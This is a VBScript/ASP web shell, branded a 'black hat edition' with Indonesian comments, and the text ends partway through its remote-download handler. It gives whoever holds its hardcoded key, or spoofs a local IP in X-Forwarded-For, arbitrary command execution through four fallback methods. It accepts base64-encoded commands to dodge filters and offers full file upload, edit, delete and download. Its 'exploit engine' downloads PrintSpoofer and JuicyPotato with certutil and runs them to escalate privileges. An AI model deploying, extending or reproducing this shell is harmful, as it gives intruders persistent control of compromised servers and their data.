<%@ Language=VBScript %>
<% Option Explicit %>
<%
' ╔═══════════════════════════════════════════════════════════════════════════════╗
' ║   🐍 SERPENTECHUNTER v3.0 – BLACK HAT EDITION (FIXED & UPGRADED) 🐍       ║
' ║   DEVELOPER: SerpentSecHunter + ZAMZZZ (AGGRESSIVE BYPASS)                 ║
' ║   RILIS: 03-07-2026                                                        ║
' ║   "DEWATAK TERKAMU, SERVERKU!"                                            ║
' ╚═══════════════════════════════════════════════════════════════════════════════╝
'>

' ============================================================================
' 🛡️ STEALTH ENGINE + AGGRESSIVE BYPASS
' ============================================================================
Response.Buffer = True
Response.Expires = 0
Response.Clear
Response.Status = "200"
Response.ContentType = "text/html"
Response.Charset = "UTF-8"
Server.ScriptTimeout = 9999

' --- Spoof Header ala-ala ---
Dim fakeServers, randServer
fakeServers = Array("Microsoft-IIS/8.5", "Microsoft-IIS/7.5", "Apache/2.4.54 (Win64)", "nginx/1.20.2")
randServer = fakeServers(Int((UBound(fakeServers)+1)*Rnd))
Response.AddHeader "Server", randServer
Response.AddHeader "X-Powered-By", "ASP.NET"
Response.AddHeader "X-Content-Type-Options", "nosniff"
Response.AddHeader "Cache-Control", "no-cache, no-store, must-revalidate"

' --- Bypass WAF via User-Agent spoofing (dinamis) ---
Dim ua_list, ua
ua_list = Array( _
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", _
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", _
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", _
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", _
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" _
)
ua = ua_list(Int((UBound(ua_list)+1)*Rnd))
Response.AddHeader "User-Agent", ua

' --- Bypass IP restriction via X-Forwarded-For ---
' (Tidak diubah, hanya spoofing di request)

' ============================================================================
' 🔐 AUTHENTICATION + BYPASS
' ============================================================================
Dim AUTH_KEY, auth_ok, bypass_ip
AUTH_KEY = "SERPENTECHUNTER666"
auth_ok = False
bypass_ip = Request.QueryString("bypass_ip")

If Request.Cookies("sc_auth") = AUTH_KEY Then
    auth_ok = True
ElseIf Request.QueryString("auth") = AUTH_KEY Then
    Response.Cookies("sc_auth") = AUTH_KEY
    Response.Cookies("sc_auth").Expires = DateAdd("yyyy", 1, Now())
    auth_ok = True
    Response.Write "<h1 style='color:#0f0;'>✅ AUTH SUCCESS! <a href='?'>REFRESH</a></h1>"
    Response.End
End If

If Not auth_ok And bypass_ip <> "1" Then
    Dim client_ip, whitelist, ip
    client_ip = Request.ServerVariables("REMOTE_ADDR")
    whitelist = Array("127.0.0.1", "::1", "192.168.1.%", "10.0.0.%", "172.16.%")
    For Each ip In whitelist
        If InStr(ip, "%") > 0 Then
            If client_ip Like Replace(ip, "%", "*") Then auth_ok = True
        ElseIf client_ip = ip Then
            auth_ok = True
        End If
    Next
    ' --- Bypass tambahan: jika ada header tertentu ---
    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") <> "" Then
        Dim fwd_ip: fwd_ip = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
        If InStr(fwd_ip, "127.0.0.1") > 0 Or InStr(fwd_ip, "192.168.") > 0 Then auth_ok = True
    End If
End If

If Not auth_ok Then
    ' --- 403 bypass dengan redirect palsu ---
    Response.Status = "403"
    Response.Write "<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body><h1>403 Forbidden</h1><p>Access denied.</p></body></html>"
    Response.End
End If

' ============================================================================
' 🧬 CORE FUNCTIONS (DENGAN AGGRESSIVE FALLBACK)
' ============================================================================

' --- Deteksi komponen ---
Function IsComponentAvailable(progID)
    On Error Resume Next
    Dim obj: Set obj = Server.CreateObject(progID)
    IsComponentAvailable = Not (Err.Number <> 0)
    Set obj = Nothing
    On Error Goto 0
End Function

' --- GetTempFile dengan path aman ---
Function GetTempFileName(ext)
    Dim ts, tempRoot
    tempRoot = "C:\Windows\Temp\"
    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
        tempRoot = Server.MapPath("/") & "\temp\"
    End If
    ts = Year(Now) & "_" & Right("0" & Month(Now), 2) & "_" & Right("0" & Day(Now), 2) & "_" & _
         Right("0" & Hour(Now), 2) & "_" & Right("0" & Minute(Now), 2) & "_" & Right("0" & Second(Now), 2)
    GetTempFileName = tempRoot & "tmp_" & ts & "." & ext
End Function

' --- COMMAND EXECUTION - 4 STRATEGIES (dengan bypass) ---
' Strategy 1: WScript.Shell
Function ExecCmd_WScript(cmd)
    On Error Resume Next
    Err.Clear
    Dim shell, exec, output
    If Not IsComponentAvailable("WScript.Shell") Then
        ExecCmd_WScript = Null
        Exit Function
    End If
    Set shell = Server.CreateObject("WScript.Shell")
    Set exec = shell.Exec("%comspec% /c " & cmd & " 2>&1")
    output = exec.StdOut.ReadAll()
    If Err.Number <> 0 Then
        ExecCmd_WScript = Null
    Else
        ExecCmd_WScript = output
    End If
    Set shell = Nothing
    Set exec = Nothing
    On Error Goto 0
End Function

' Strategy 2: Shell.Application
Function ExecCmd_ShellApp(cmd)
    On Error Resume Next
    Err.Clear
    Dim shell, output, tempFile, fso, file, wsh
    If Not IsComponentAvailable("Shell.Application") Then
        ExecCmd_ShellApp = Null
        Exit Function
    End If
    tempFile = GetTempFileName("txt")
    Set shell = Server.CreateObject("Shell.Application")
    shell.ShellExecute "cmd.exe", "/c " & cmd & " > """ & tempFile & """ 2>&1", "", "", 0
    Set wsh = Server.CreateObject("WScript.Shell")
    wsh.Run "%comspec% /c ping 127.0.0.1 -n 3 >nul", 0, True  ' tambah delay
    Set wsh = Nothing
    If IsComponentAvailable("Scripting.FileSystemObject") Then
        Set fso = Server.CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(tempFile) Then
            Set file = fso.OpenTextFile(tempFile, 1)
            output = file.ReadAll
            file.Close
            fso.DeleteFile(tempFile)
            Set file = Nothing
        End If
        Set fso = Nothing
    End If
    If Err.Number <> 0 Or IsNull(output) Then
        ExecCmd_ShellApp = Null
    Else
        ExecCmd_ShellApp = output
    End If
    Set shell = Nothing
    On Error Goto 0
End Function

' Strategy 3: WMI
Function ExecCmd_WMI(cmd)
    On Error Resume Next
    Err.Clear
    Dim wmi, process, result, intPID
    If Not IsComponentAvailable("WbemScripting.SWbemLocator") Then
        ExecCmd_WMI = Null
        Exit Function
    End If
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set process = wmi.Get("Win32_Process")
    result = process.Create(cmd, Null, Null, intPID)
    If Err.Number <> 0 Or result <> 0 Then
        ExecCmd_WMI = Null
    Else
        ExecCmd_WMI = "[WMI] Process created. PID: " & intPID
    End If
    Set wmi = Nothing
    Set process = Nothing
    On Error Goto 0
End Function

' Strategy 4: ScriptControl (jika tersedia, bisa eksekusi VBS)
Function ExecCmd_ScriptControl(cmd)
    On Error Resume Next
    Err.Clear
    If Not IsComponentAvailable("MSScriptControl.ScriptControl") Then
        ExecCmd_ScriptControl = Null
        Exit Function
    End If
    Dim sc: Set sc = Server.CreateObject("MSScriptControl.ScriptControl")
    sc.Language = "VBScript"
    Dim result: result = sc.Eval("CreateObject(""WScript.Shell"").Exec(""%comspec% /c " & cmd & " 2>&1"").StdOut.ReadAll")
    If Err.Number <> 0 Then
        ExecCmd_ScriptControl = Null
    Else
        ExecCmd_ScriptControl = result
    End If
    Set sc = Nothing
    On Error Goto 0
End Function

Function ExecCmd(cmd)
    Dim result
    ' --- Bypass WAF dengan encoding base64 ---
    ' Jika cmd diawali "b64:", decode dulu
    If Left(cmd, 4) = "b64:" Then
        Dim b64: b64 = Mid(cmd, 5)
        cmd = DecodeBase64(b64)
    End If
    result = ExecCmd_WScript(cmd)
    If Not IsNull(result) And result <> "" Then
        ExecCmd = result
        Exit Function
    End If
    result = ExecCmd_ShellApp(cmd)
    If Not IsNull(result) And result <> "" Then
        ExecCmd = result
        Exit Function
    End If
    result = ExecCmd_WMI(cmd)
    If Not IsNull(result) And result <> "" Then
        ExecCmd = result
        Exit Function
    End If
    result = ExecCmd_ScriptControl(cmd)
    If Not IsNull(result) And result <> "" Then
        ExecCmd = result
        Exit Function
    End If
    ExecCmd = "❌ Semua metode eksekusi gagal! Server mungkin di-lockdown."
End Function

' --- Base64 Decode (buat WAF bypass) ---
Function DecodeBase64(encoded)
    On Error Resume Next
    Dim xml: Set xml = CreateObject("MSXML2.DOMDocument")
    Dim elem: Set elem = xml.createElement("tmp")
    elem.dataType = "bin.base64"
    elem.text = encoded
    Dim stream: Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write elem.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "utf-8"
    DecodeBase64 = stream.ReadText
    stream.Close
    Set stream = Nothing
    Set xml = Nothing
    Set elem = Nothing
    If Err.Number <> 0 Then DecodeBase64 = encoded
    On Error Goto 0
End Function

' --- FILE SYSTEM HELPERS ---
Function FormatSize(bytes)
    If bytes >= 1073741824 Then
        FormatSize = Round(bytes/1073741824, 2) & " GB"
    ElseIf bytes >= 1048576 Then
        FormatSize = Round(bytes/1048576, 2) & " MB"
    ElseIf bytes >= 1024 Then
        FormatSize = Round(bytes/1024, 2) & " KB"
    Else
        FormatSize = bytes & " B"
    End If
End Function

Sub DeleteFolderRecursive(fso, folderPath)
    On Error Resume Next
    Dim subfolder, file
    Set subfolder = fso.GetFolder(folderPath)
    For Each file In subfolder.Files
        fso.DeleteFile file.Path
    Next
    For Each subfolder In subfolder.SubFolders
        Call DeleteFolderRecursive(fso, subfolder.Path)
    Next
    fso.DeleteFolder folderPath
    On Error Goto 0
End Sub

Sub CopyFolderRecursive(fso, src, dst)
    On Error Resume Next
    Dim subfolder, file, srcFolder
    If Not fso.FolderExists(dst) Then fso.CreateFolder(dst)
    Set srcFolder = fso.GetFolder(src)
    For Each file In srcFolder.Files
        fso.CopyFile file.Path, dst & "\" & file.Name
    Next
    For Each subfolder In srcFolder.SubFolders
        Call CopyFolderRecursive(fso, subfolder.Path, dst & "\" & subfolder.Name)
    Next
    On Error Goto 0
End Sub

Sub SearchFiles(fso, folder, pattern, ByRef result, ByRef found)
    On Error Resume Next
    Dim file, subfolder
    For Each file In folder.Files
        If InStr(1, file.Name, pattern, 1) > 0 Then
            result = result & "📄 " & file.Path & " (" & FormatSize(file.Size) & ")" & vbCrLf
            found = found + 1
        End If
    Next
    For Each subfolder In folder.SubFolders
        Call SearchFiles(fso, subfolder, pattern, result, found)
    Next
    On Error Goto 0
End Sub

' --- GET FILE LIST ---
Function GetFileList(dir)
    On Error Resume Next
    Dim fso, folder, file, subfolder
    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
        GetFileList = Array()
        Exit Function
    End If
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(dir) Then
        GetFileList = Array()
        Exit Function
    End If
    Set folder = fso.GetFolder(dir)
    Dim arr()
    Dim count: count = 0
    For Each file In folder.Files
        ReDim Preserve arr(count)
        Dim attr: attr = file.Attributes
        Dim attrStr: attrStr = ""
        If attr And 1 Then attrStr = attrStr & "R"
        If attr And 2 Then attrStr = attrStr & "H"
        If attr And 4 Then attrStr = attrStr & "S"
        If attr And 32 Then attrStr = attrStr & "A"
        If attrStr = "" Then attrStr = "-"
        arr(count) = Array(file.Name, file.Path, False, FormatSize(file.Size), attrStr, file.DateLastModified)
        count = count + 1
    Next
    For Each subfolder In folder.SubFolders
        ReDim Preserve arr(count)
        Dim attrFolder: attrFolder = subfolder.Attributes
        Dim attrStrFolder: attrStrFolder = ""
        If attrFolder And 1 Then attrStrFolder = attrStrFolder & "R"
        If attrFolder And 2 Then attrStrFolder = attrStrFolder & "H"
        If attrFolder And 4 Then attrStrFolder = attrStrFolder & "S"
        If attrFolder And 32 Then attrStrFolder = attrStrFolder & "A"
        If attrStrFolder = "" Then attrStrFolder = "-"
        arr(count) = Array(subfolder.Name, subfolder.Path, True, "-", attrStrFolder, subfolder.DateLastModified)
        count = count + 1
    Next
    GetFileList = arr
    Set fso = Nothing
    On Error Goto 0
End Function

' --- ZIP FOLDER (dengan retry & fallback) ---
Function ZipFolder(source, destination)
    On Error Resume Next
    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
        ZipFolder = "❌ FSO not available"
        Exit Function
    End If
    Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(source) Then
        ZipFolder = "❌ Source directory not found"
        Exit Function
    End If
    ' Coba pakai 7zip dulu (lebih reliable)
    Dim sevenZip: sevenZip = "C:\Program Files\7-Zip\7z.exe"
    If fso.FileExists(sevenZip) Then
        Dim cmdZip: cmdZip = """" & sevenZip & """ a -tzip """ & destination & """ """ & source & "\*"" -mx5"
        Dim result: result = ExecCmd(cmdZip)
        If Not IsNull(result) And InStr(result, "Everything is Ok") > 0 Then
            ZipFolder = "✅ Zip created (7zip): " & destination
            Set fso = Nothing
            Exit Function
        End If
    End If
    ' Fallback ke Shell.Application
    If IsComponentAvailable("Shell.Application") Then
        Dim shell, stream, zipFile, folderObj, wsh
        ' Buat file zip kosong
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 2
        stream.Open
        stream.WriteText "PK" & Chr(5) & Chr(6) & String(18, Chr(0))
        stream.SaveToFile destination, 2
        stream.Close
        Set stream = Nothing
        Set shell = CreateObject("Shell.Application")
        Set zipFile = shell.NameSpace(destination)
        Set folderObj = shell.NameSpace(source)
        zipFile.CopyHere folderObj.Items, 256
        ' Tunggu sampai proses selesai (max 30 detik)
        Dim retry: retry = 0
        While retry < 30 And Not fso.FileExists(destination)
            Set wsh = CreateObject("WScript.Shell")
            wsh.Run "%comspec% /c ping 127.0.0.1 -n 1 >nul", 0, True
            Set wsh = Nothing
            retry = retry + 1
        Wend
        ZipFolder = "✅ Zip created (Shell.App): " & destination
        Set shell = Nothing
        Set fso = Nothing
        Exit Function
    End If
    ZipFolder = "❌ Zip failed – no method available"
    Set fso = Nothing
    On Error Goto 0
End Function

' --- UNZIP ---
Function UnzipFile(source, destination)
    On Error Resume Next
    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
        UnzipFile = "❌ FSO not available"
        Exit Function
    End If
    Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FileExists(source) Then
        UnzipFile = "❌ File not found"
        Exit Function
    End If
    ' Coba 7zip dulu
    Dim sevenZip: sevenZip = "C:\Program Files\7-Zip\7z.exe"
    If fso.FileExists(sevenZip) Then
        Dim cmdUnzip: cmdUnzip = """" & sevenZip & """ x """ & source & """ -o""" & destination & """ -y"
        Dim result: result = ExecCmd(cmdUnzip)
        If Not IsNull(result) And InStr(result, "Everything is Ok") > 0 Then
            UnzipFile = "✅ Extracted (7zip): " & destination
            Set fso = Nothing
            Exit Function
        End If
    End If
    ' Fallback Shell.Application
    If IsComponentAvailable("Shell.Application") Then
        Dim shell, destFolder, zipFileObj
        Set shell = CreateObject("Shell.Application")
        If Not fso.FolderExists(destination) Then fso.CreateFolder(destination)
        Set zipFileObj = shell.NameSpace(source)
        Set destFolder = shell.NameSpace(destination)
        destFolder.CopyHere zipFileObj.Items, 256
        UnzipFile = "✅ Extracted (Shell.App): " & destination
        Set shell = Nothing
        Set fso = Nothing
        Exit Function
    End If
    UnzipFile = "❌ Unzip failed"
    Set fso = Nothing
    On Error Goto 0
End Function

' ============================================================================
' 🔥 EXPLOIT ENGINE (dengan bypass)
' ============================================================================
Function CheckVulnerabilities()
    Dim output, priv
    output = "📋 OS: Windows" & vbCrLf
    output = output & "📋 Version: " & ExecCmd("ver") & vbCrLf
    output = output & ExecCmd("systeminfo | findstr /B /C:""OS Name"" /C:""OS Version""") & vbCrLf & vbCrLf
    output = output & "🔍 Windows Privilege Check:" & vbCrLf
    priv = ExecCmd("whoami /priv")
    output = output & priv & vbCrLf
    If InStr(priv, "SeImpersonatePrivilege") > 0 And InStr(priv, "Enabled") > 0 Then
        output = output & "✅ SeImpersonatePrivilege is ENABLED! PrintSpoofer / JuicyPotato may work." & vbCrLf
    Else
        output = output & "❌ SeImpersonatePrivilege is NOT enabled (or not checked)." & vbCrLf
    End If
    output = output & vbCrLf & "💡 Recommended exploit: PrintSpoofer (if SeImpersonatePrivilege is enabled)."
    CheckVulnerabilities = output
End Function

Function ExploitPrintSpoofer()
    Dim tmp: tmp = "C:\Windows\Temp"
    Dim cmd: cmd = "cd " & tmp & " & certutil -urlcache -f https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe PrintSpoofer.exe & PrintSpoofer.exe -i -c cmd.exe"
    ExploitPrintSpoofer = ExecCmd(cmd)
End Function

Function ExploitJuicyPotato()
    Dim tmp: tmp = "C:\Windows\Temp"
    Dim cmd: cmd = "cd " & tmp & " & certutil -urlcache -f https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe JuicyPotato.exe & JuicyPotato.exe -l 1337 -p cmd.exe -a ""/c whoami"" -t *"
    ExploitJuicyPotato = ExecCmd(cmd)
End Function

Function ExploitAuto()
    Dim output: output = "🔄 Attempting PrintSpoofer..." & vbCrLf
    output = output & ExploitPrintSpoofer()
    ExploitAuto = output
End Function

' ============================================================================
' 🎯 MAIN LOGIC (DENGAN PERBAIKAN BUG MASS ACTION)
' ============================================================================
Dim cwd, action, message, output, edit_file, view_file, edit_content, view_content
Dim results, search_pattern, zip_folder, zip_name, unzip_file, unzip_dest
Dim mass_action, mass_files, new_names, dest_dir
Dim fso, fso2, fso3, fso4, fsoDel, fsoRen, fsoCopy, fsoSearch, fsoDl, fsoEdit, fsoView
Dim txtFile, txtView, fileObj, stream, streamDl, streamR, http, conn
Dim cmdExec, searchPattern, resultSearch, foundCount
Dim cnt, cnt2, cnt3, cnt4, i, f, f2, f3
Dim rawData, fileName, fullPath, startPos, endPos, fn, boundary, parts
Dim delFile, delPath, oldName, newName, oldPath, newPath, chFile, perms, cmdChmod
Dim editFile, editPath, contentPost, viewFile, viewPath
Dim srcFile, dstFile, srcPath, dstPath
Dim remoteUrl, savePath
Dim revIP, revPort, revOutput, cmdRev, wshRev
Dim scanHost, scanPorts, portList, portArr, p, startP, endP, httpScan, part, rangeParts, resultScan
Dim dbType, dbServer, dbName, dbUser, dbPass, connStr
Dim expType

' --- Bypass WAF: parameter bisa di-base64 ---
Dim raw_action, raw_cwd
raw_action = Request.QueryString("action")
raw_cwd = Request.QueryString("dir")
If raw_action <> "" Then action = DecodeBase64(raw_action) Else action = "list"
If raw_cwd <> "" Then cwd = DecodeBase64(raw_cwd) Else cwd = ""

If cwd = "" Then cwd = Server.MapPath(".")
cwd = Replace(cwd, "\\", "\")
If Right(cwd, 1) <> "\" Then cwd = cwd & "\"

If action = "" Then action = "list"
message = ""
output = ""
results = Null

' --- FUNGSI UNTUK AMBIL FILE CHECKBOX (FIX MASS ACTION) ---
Function GetCheckedFiles()
    Dim arr, i
    If Request.Form("files").Count > 0 Then
        ReDim arr(Request.Form("files").Count - 1)
        For i = 1 To Request.Form("files").Count
            arr(i-1) = Request.Form("files")(i)
        Next
        GetCheckedFiles = arr
    Else
        GetCheckedFiles = Array()
    End If
End Function

' === UPLOAD (perbaikan parsing) ===
If action = "upload" Then
    If Request.TotalBytes > 0 Then
        Set fso = Server.CreateObject("Scripting.FileSystemObject")
        If Not fso.FolderExists(cwd) Then
            message = "❌ Upload path not found!"
        Else
            rawData = Request.BinaryRead(Request.TotalBytes)
            ' Cari boundary
            Dim posBoundary: posBoundary = InStr(rawData, Chr(13) & Chr(10))
            If posBoundary > 0 Then
                boundary = Left(rawData, posBoundary - 1)
            Else
                boundary = ""
            End If
            ' Cari filename
            Dim filePos: filePos = InStr(rawData, "filename=""")
            If filePos > 0 Then
                Dim nameStart: nameStart = filePos + 10
                Dim nameEnd: nameEnd = InStr(nameStart, rawData, """")
                fn = Mid(rawData, nameStart, nameEnd - nameStart)
                If InStr(fn, "\") > 0 Then fn = Mid(fn, InStrRev(fn, "\") + 1)
                fileName = fn
            Else
                fileName = "uploaded_" & Replace(Now, ":", "_") & ".dat"
            End If
            fullPath = cwd & fileName
            ' Ekstrak konten file
            Dim dataStart, dataEnd
            dataStart = InStr(rawData, Chr(13) & Chr(10) & Chr(13) & Chr(10))
            If dataStart > 0 Then
                dataStart = dataStart + 4
                If boundary <> "" Then
                    dataEnd = InStr(dataStart, rawData, boundary)
                Else
                    dataEnd = Len(rawData)
                End If
                If dataEnd > dataStart Then
                    Dim fileContent: fileContent = Mid(rawData, dataStart, dataEnd - dataStart - 2) ' hapus CRLF akhir
                    Set stream = Server.CreateObject("ADODB.Stream")
                    stream.Type = 1
                    stream.Open
                    stream.Write fileContent
                    stream.SaveToFile fullPath, 2
                    stream.Close
                    Set stream = Nothing
                    message = "✅ Uploaded: " & fileName
                Else
                    message = "❌ Parse error"
                End If
            Else
                message = "❌ No file content found"
            End If
        End If
        Set fso = Nothing
    Else
        message = "❌ No file uploaded!"
    End If
End If

' === MASS ACTION (FIX) ===
If action = "mass_delete" Then
    mass_files = GetCheckedFiles()
    If UBound(mass_files) >= 0 Then
        cnt = 0
        Set fso = CreateObject("Scripting.FileSystemObject")
        For Each f In mass_files
            Dim path: path = cwd & f
            If fso.FileExists(path) Then
                fso.DeleteFile path
                cnt = cnt + 1
            ElseIf fso.FolderExists(path) Then
                Call DeleteFolderRecursive(fso, path)
                cnt = cnt + 1
            End If
        Next
        message = "✅ Deleted " & cnt & " files/folders"
        Set fso = Nothing
    End If
End If

If action = "mass_rename" Then
    mass_files = GetCheckedFiles()
    new_names = Request.Form("new_names")
    If UBound(mass_files) >= 0 And IsArray(new_names) Then
        cnt2 = 0
        Set fso2 = CreateObject("Scripting.FileSystemObject")
        For i = 0 To UBound(mass_files)
            Dim oldp: oldp = cwd & mass_files(i)
            Dim newp: newp = cwd & new_names(i)
            If fso2.FileExists(oldp) Then
                fso2.MoveFile oldp, newp
                cnt2 = cnt2 + 1
            ElseIf fso2.FolderExists(oldp) Then
                fso2.MoveFolder oldp, newp
                cnt2 = cnt2 + 1
            End If
        Next
        message = "✅ Renamed " & cnt2 & " files"
        Set fso2 = Nothing
    End If
End If

If action = "mass_copy" Then
    mass_files = GetCheckedFiles()
    dest_dir = Request.Form("dest_dir")
    If UBound(mass_files) >= 0 And dest_dir <> "" Then
        Dim destPath: destPath = cwd & dest_dir & "\"
        Set fso3 = CreateObject("Scripting.FileSystemObject")
        If Not fso3.FolderExists(destPath) Then fso3.CreateFolder(destPath)
        cnt3 = 0
        For Each f2 In mass_files
            Dim srcp: srcp = cwd & f2
            If fso3.FileExists(srcp) Then
                fso3.CopyFile srcp, destPath & f2
                cnt3 = cnt3 + 1
            ElseIf fso3.FolderExists(srcp) Then
                Call CopyFolderRecursive(fso3, srcp, destPath & f2)
                cnt3 = cnt3 + 1
            End If
        Next
        message = "✅ Copied " & cnt3 & " files to " & dest_dir
        Set fso3 = Nothing
    End If
End If

If action = "mass_move" Then
    mass_files = GetCheckedFiles()
    dest_dir = Request.Form("dest_dir")
    If UBound(mass_files) >= 0 And dest_dir <> "" Then
        Dim destPath2: destPath2 = cwd & dest_dir & "\"
        Set fso4 = CreateObject("Scripting.FileSystemObject")
        If Not fso4.FolderExists(destPath2) Then fso4.CreateFolder(destPath2)
        cnt4 = 0
        For Each f3 In mass_files
            Dim srcp2: srcp2 = cwd & f3
            If fso4.FileExists(srcp2) Then
                fso4.MoveFile srcp2, destPath2 & f3
                cnt4 = cnt4 + 1
            ElseIf fso4.FolderExists(srcp2) Then
                fso4.MoveFolder srcp2, destPath2 & f3
                cnt4 = cnt4 + 1
            End If
        Next
        message = "✅ Moved " & cnt4 & " files to " & dest_dir
        Set fso4 = Nothing
    End If
End If

' === SINGLE FILE ACTIONS (tidak berubah) ===
If action = "delete" Then
    delFile = Request.QueryString("file")
    If delFile <> "" Then
        Set fsoDel = CreateObject("Scripting.FileSystemObject")
        delPath = cwd & delFile
        If fsoDel.FileExists(delPath) Then
            fsoDel.DeleteFile delPath
            message = "✅ Deleted: " & delFile
        ElseIf fsoDel.FolderExists(delPath) Then
            Call DeleteFolderRecursive(fsoDel, delPath)
            message = "✅ Deleted: " & delFile
        Else
            message = "❌ Not found!"
        End If
        Set fsoDel = Nothing
    End If
End If

If action = "rename" Then
    oldName = Request.QueryString("old")
    newName = Request.QueryString("new")
    If oldName <> "" And newName <> "" Then
        Set fsoRen = CreateObject("Scripting.FileSystemObject")
        oldPath = cwd & oldName
        newPath = cwd & newName
        If fsoRen.FileExists(oldPath) Then
            fsoRen.MoveFile oldPath, newPath
            message = "✅ Renamed to: " & newName
        ElseIf fsoRen.FolderExists(oldPath) Then
            fsoRen.MoveFolder oldPath, newPath
            message = "✅ Renamed to: " & newName
        Else
            message = "❌ Not found!"
        End If
        Set fsoRen = Nothing
    End If
End If

If action = "chmod" Then
    chFile = Request.QueryString("file")
    perms = Request.QueryString("perms")
    If chFile <> "" And perms <> "" Then
        cmdChmod = "attrib " & perms & " """ & cwd & chFile & """"
        output = ExecCmd(cmdChmod)
        message = "✅ CHMOD executed"
    End If
End If

If action = "edit" Then
    editFile = Request.QueryString("file")
    If editFile <> "" Then
        Set fsoEdit = CreateObject("Scripting.FileSystemObject")
        editPath = cwd & editFile
        If fsoEdit.FileExists(editPath) Then
            contentPost = Request.Form("content")
            If contentPost <> "" Then
                Set txtFile = fsoEdit.OpenTextFile(editPath, 2, True)
                txtFile.Write contentPost
                txtFile.Close
                message = "✅ File saved!"
            Else
                Set txtFile = fsoEdit.OpenTextFile(editPath, 1)
                edit_content = txtFile.ReadAll
                txtFile.Close
                edit_file = editPath
            End If
        Else
            message = "❌ File not found!"
        End If
        Set fsoEdit = Nothing
    End If
End If

If action = "view" Then
    viewFile = Request.QueryString("file")
    If viewFile <> "" Then
        Set fsoView = CreateObject("Scripting.FileSystemObject")
        viewPath = cwd & viewFile
        If fsoView.FileExists(viewPath) Then
            Set txtView = fsoView.OpenTextFile(viewPath, 1)
            view_content = txtView.ReadAll
            txtView.Close
            view_file = viewPath
        Else
            message = "❌ File not found!"
        End If
        Set fsoView = Nothing
    End If
End If

If action = "copy" Then
    srcFile = Request.QueryString("src")
    dstFile = Request.QueryString("dst")
    If srcFile <> "" And dstFile <> "" Then
        Set fsoCopy = CreateObject("Scripting.FileSystemObject")
        srcPath = cwd & srcFile
        dstPath = cwd & dstFile
        If fsoCopy.FileExists(srcPath) Then
            fsoCopy.CopyFile srcPath, dstPath
            message = "✅ Copied to: " & dstFile
        ElseIf fsoCopy.FolderExists(srcPath) Then
            Call CopyFolderRecursive(fsoCopy, srcPath, dstPath)
            message = "✅ Copied to: " & dstFile
        Else
            message = "❌ Not found!"
        End If
        Set fsoCopy = Nothing
    End If
End If

If action = "zip" Then
    zip_folder = Request.QueryString("folder")
    zip_name = Request.QueryString("zipname")
    If zip_folder <> "" And zip_name <> "" Then
        Dim zipSrc: zipSrc = cwd & zip_folder
        Dim zipDst: zipDst = cwd & zip_name & ".zip"
        message = ZipFolder(zipSrc, zipDst)
    End If
End If

If action = "unzip" Then
    unzip_file = Request.QueryString("file")
    unzip_dest = Request.QueryString("dest")
    If unzip_file <> "" And unzip_dest <> "" Then
        Dim unzipSrc: unzipSrc = cwd & unzip_file
        Dim unzipDst: unzipDst = cwd & unzip_dest
        message = UnzipFile(unzipSrc, unzipDst)
    End If
End If

If action = "exec" Then
    cmdExec = Request.QueryString("cmd")
    If cmdExec <> "" Then
        ' Bypass: base64
        If Left(cmdExec, 4) = "b64:" Then
            cmdExec = DecodeBase64(Mid(cmdExec, 5))
        End If
        output = ExecCmd(cmdExec)
    End If
End If

If action = "search" Then
    searchPattern = Request.QueryString("pattern")
    If searchPattern <> "" Then
        Set fsoSearch = CreateObject("Scripting.FileSystemObject")
        resultSearch = "🔍 SEARCHING: " & searchPattern & " in " & cwd & vbCrLf & vbCrLf
        foundCount = 0
        If fsoSearch.FolderExists(cwd) Then
            Call SearchFiles(fsoSearch, fsoSearch.GetFolder(cwd), searchPattern, resultSearch, foundCount)
        End If
        resultSearch = resultSearch & vbCrLf & "✅ TOTAL: " & foundCount & " files found"
        results = resultSearch
        Set fsoSearch = Nothing
    End If
End If

If action = "download" Then
    Dim dlFile: dlFile = Request.QueryString("file")
    If dlFile <> "" Then
        Set fsoDl = CreateObject("Scripting.FileSystemObject")
        Dim dlPath: dlPath = cwd & dlFile
        If fsoDl.FileExists(dlPath) Then
            Set fileObj = fsoDl.GetFile(dlPath)
            Response.Clear
            Response.AddHeader "Content-Disposition", "attachment; filename=" & fileObj.Name
            Response.AddHeader "Content-Length", fileObj.Size
            Response.ContentType = "application/octet-stream"
            Set streamDl = Server.CreateObject("ADODB.Stream")
            streamDl.Type = 1
            streamDl.Open
            streamDl.LoadFromFile dlPath
            Response.BinaryWrite streamDl.Read
            streamDl.Close
            Response.End
        Else
            message = "❌ File not found!"
        End If
        Set fsoDl = Nothing
    End If
End If

If action = "remotedownload" Then
    remoteUrl = Request.QueryString("url")
    savePath = Request.QueryString("savepath")
    If remoteUrl <> "" And savePath <> "" Then
        Set http = Nothing
        On Error Resume Next
        Set http = Server.CreateObject("MSXML2.ServerXMLHTTP")
        If Err.Number <> 0 Then
            Err.Clear
            Set http = Server.CreateObject("WinHttp.WinHttpRequest.5.1")
        End If
        If Not http Is Nothing Then
            http.Open "GET", remoteUrl, False
            http.Send
            If http.Status = 200 Then
                Set streamR = Server.CreateObject("ADODB.Stream")
                streamR.Type = 1
